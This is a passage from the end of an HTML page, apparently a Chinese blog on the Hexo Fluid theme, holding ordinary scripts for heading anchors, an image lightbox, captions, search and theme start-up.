      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
